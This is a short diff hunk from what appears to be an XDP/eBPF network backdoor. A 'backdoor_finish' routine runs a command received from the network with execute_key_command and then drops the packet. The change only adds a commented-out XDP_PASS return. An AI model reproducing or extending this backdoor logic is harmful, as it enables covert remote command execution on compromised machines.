@@ -171,7 +171,7 @@ backdoor_finish:
 
     execute_key_command(command_received, ip, port);
 
-
+    //return XDP_PASS;
     return XDP_DROP; 
 }
 
